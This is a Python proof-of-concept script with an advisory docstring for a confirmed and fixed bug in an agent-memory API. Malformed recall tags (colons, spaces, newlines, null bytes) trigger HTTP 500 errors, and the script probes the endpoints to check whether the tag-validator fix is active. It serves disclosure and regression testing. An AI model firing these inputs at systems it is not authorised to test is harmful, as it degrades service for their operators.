#!/usr/bin/env python3
"""
BUG 8 — Authenticated DoS via Invalid Tag Filter (HTTP 500)
============================================================
Severity: MEDIUM-HIGH
Status: CONFIRMED LIVE (tested 2026-10-11)
Fixed in: memanto/app/routes/memory.py (tag validators added)

Attack summary
--------------
Any authenticated user can force the server to return HTTP 500 by
supplying a recall tag containing a space, colon, hash sign, or any
character outside [A-Za-z0-9_.-].  The error is repeatable and requires
no special privileges beyond a valid session token.

    POST /api/v2/agents/{id}/recall
    X-Session-Token: <valid_token>
    {"query": "test", "limit": 3, "tags": ["tag:with:colon"]}
    → HTTP 500 Internal Server Error
      {"error": "MemoryOperationError",
       "message": "Failed to search memories: Invalid tag filter value..."}

Root cause trace
----------------
  RecallRequest.tags              ← no @field_validator before the fix
  recall() route handler
  → search_memories(tags=["tag:colon"])
  → _build_filtered_query()
  → _validate_filter_token("tag:colon")   ← raises ValueError
  → except Exception as e:
        raise MemoryOperationError(...)   ← ValueError swallowed
  → map_error_to_http_exception(MemoryOperationError) → HTTP 500

The same code path is hit by RecallAsOfRequest, RecallChangedSinceRequest,
and RecallRecentRequest (used by /recall/recent and /recall/all).

Impact
------
  • Any user with a session token can repeatedly trigger 500s on any
    recall variant endpoint.
  • Errors appear in server logs as unhandled internal exceptions,
    masking legitimate operational issues.
  • No rate limiting on recall endpoints amplifies the impact.

Fix (applied)
-------------
  Added _RECALL_TAG_RE = re.compile(r"^[A-Za-z0-9_.-]+$") and a
  _validate_recall_tag_filters() helper in memory.py, then wired it as
  a @field_validator("tags") on all four recall request models:
    - RecallRequest
    - RecallAsOfRequest
    - RecallChangedSinceRequest
    - RecallRecentRequest

  Invalid tags now return HTTP 422 with a clear message before reaching
  the query builder.

Prerequisites
-------------
  pip install requests

Usage
-----
  # Before the fix — confirm HTTP 500
  python bug8_tag_dos.py --host http://127.0.0.1:8765

  # After the fix — confirm HTTP 422
  python bug8_tag_dos.py --host http://127.0.0.1:8765

  # Provide an existing session token to skip activation
  python bug8_tag_dos.py --host http://127.0.0.1:8765 --token <tok>
"""

import argparse
import sys

import requests


def step(n, msg):  print(f"\n[Step {n}] {msg}")
def ok(msg):       print(f"  \033[92m[PASS]\033[0m  {msg}")
def fail(msg):     print(f"  \033[91m[VULN]\033[0m  {msg}")
def info(msg):     print(f"  \033[94m[INFO]\033[0m  {msg}")


# Tags that all contain characters outside [A-Za-z0-9_.-]
INVALID_TAGS = [
    (["tag:with:colon"],    "colon in tag"),
    (["tag with spaces"],   "space in tag"),
    (["#memory_type:fact"], "leading hash + colon"),
    (["tag\nnewline"],      "embedded newline"),
    (["tag\x00null"],       "null byte"),
]

VALID_TAGS = [
    (["valid-tag"],         "hyphen"),
    (["snake_case"],        "underscore"),
    (["Tag.Name"],          "dot"),
    (["ABC123"],            "alphanumeric"),
]


def run(host: str, token: str | None) -> None:
    api = f"{host}/api/v2"

    print("=" * 65)
    print("BUG 8 — Authenticated DoS via Invalid Recall Tag Filter")
    print("=" * 65)

    # Get an agent and session token
    r = requests.get(f"{api}/agents", timeout=5)
    if r.status_code != 200 or not r.json().get("agents"):
        print("  No agents found — create one first")
        sys.exit(1)
    agent_id = r.json()["agents"][0]["agent_id"]
    info(f"Target agent: {agent_id!r}")

    own_session = False
    if not token:
        r = requests.post(f"{api}/agents/{agent_id}/activate", timeout=10)
        if r.status_code == 200:
            token = r.json()["session_token"]
            own_session = True
            info("Session activated for this test")
        elif r.status_code == 409:
            print("  Agent already active — pass --token <tok> to reuse the session")
            sys.exit(1)
        else:
            print(f"  Activation failed: HTTP {r.status_code}")
            sys.exit(1)

    headers = {"X-Session-Token": token}

    # Step 1: confirm valid tags work
    step(1, "Valid tags — should return HTTP 200")
    all_valid = True
    for tags, label in VALID_TAGS:
        r = requests.post(
            f"{api}/agents/{agent_id}/recall",
            json={"query": "test", "limit": 3, "tags": tags},
            headers=headers,
            timeout=5,
        )
        if r.status_code == 200:
            ok(f"tags={tags!r:25} → HTTP 200  ({label})")
        else:
            info(f"tags={tags!r:25} → HTTP {r.status_code}  ({label})")
            all_valid = False

    # Step 2: probe each invalid tag
    step(2, "Invalid tags — HTTP 500 (unfixed) or HTTP 422 (fixed)")
    vuln_count = 0
    for tags, label in INVALID_TAGS:
        r = requests.post(
            f"{api}/agents/{agent_id}/recall",
            json={"query": "test", "limit": 3, "tags": tags},
            headers=headers,
            timeout=5,
        )
        if r.status_code == 500:
            detail = r.json().get("detail", {}) if r.headers.get("content-type","").startswith("application/json") else {}
            msg = detail.get("message", "")[:80] if isinstance(detail, dict) else str(detail)[:80]
            fail(f"tags={tags!r:30} → HTTP 500  ({label})")
            info(f"  {msg}")
            vuln_count += 1
        elif r.status_code == 422:
            ok(f"tags={tags!r:30} → HTTP 422  ({label}) — fix working")
        elif r.status_code == 400:
            ok(f"tags={tags!r:30} → HTTP 400  ({label}) — rejected")
        else:
            info(f"tags={tags!r:30} → HTTP {r.status_code}  ({label})")

    # Step 3: test the same on recall/all (RecallRecentRequest)
    step(3, "Same bug via POST /recall/all (RecallRecentRequest)")
    r = requests.post(
        f"{api}/agents/{agent_id}/recall/all",
        json={"query": "test", "tags": ["tag:colon"]},
        headers=headers,
        timeout=5,
    )
    if r.status_code == 500:
        fail(f"recall/all also affected — HTTP 500")
        vuln_count += 1
    elif r.status_code == 422:
        ok(f"recall/all → HTTP 422 — fix working")
    else:
        info(f"recall/all → HTTP {r.status_code}")

    # Cleanup
    if own_session:
        requests.post(
            f"{api}/agents/{agent_id}/deactivate",
            headers=headers,
            timeout=5,
        )

    print("\n" + "=" * 65)
    print("BUG 8 — SUMMARY")
    print("=" * 65)
    if vuln_count:
        print(f"""
  VULNERABLE: {vuln_count} probe(s) returned HTTP 500 from user-supplied input.

  Root cause:  RecallRequest.tags had no @field_validator. Tags with
               characters outside [A-Za-z0-9_.-] reach _validate_filter_token()
               inside search_memories(), raise ValueError, get caught by
               `except Exception`, and surface as MemoryOperationError → 500.

  Affected endpoints:
    POST /agents/{{id}}/recall
    POST /agents/{{id}}/recall/all
    POST /agents/{{id}}/recall/recent
    POST /agents/{{id}}/recall/as-of
    POST /agents/{{id}}/recall/changed-since

  Fix:  Add @field_validator("tags") using _RECALL_TAG_RE to all four
        recall request models. Invalid tags then return HTTP 422 before
        reaching the query builder.
        (Applied in memanto/app/routes/memory.py)
""")
    else:
        print("  Not vulnerable on this build — fix is active.")


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="Bug 8 PoC — invalid tag filter DoS")
    p.add_argument("--host", default="http://127.0.0.1:8765")
    p.add_argument("--token", default=None, help="Reuse an existing session token")
    args = p.parse_args()
    run(args.host, args.token)
